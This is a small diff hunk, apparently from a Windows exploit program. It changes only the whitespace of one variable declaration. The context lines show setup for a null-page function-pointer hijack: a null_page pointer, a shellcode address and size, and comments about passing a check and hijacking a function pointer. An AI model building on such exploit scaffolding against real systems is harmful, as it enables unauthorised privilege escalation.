@@ -101,7 +101,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	SIZE_T sc_size =		0xFF;
 
 	PVOID null_page =	(PVOID) 1;
-	PVOID sc =			(PVOID) 0x1f00;	
+	PVOID sc =		(PVOID) 0x1f00;	
 	PVOID offset =		(PVOID) 0x50;   //Pass a check to take a branch we need
 	PVOID offset_ptr =	(PVOID) 0x190;  //Location of the function pointer we hijack
 
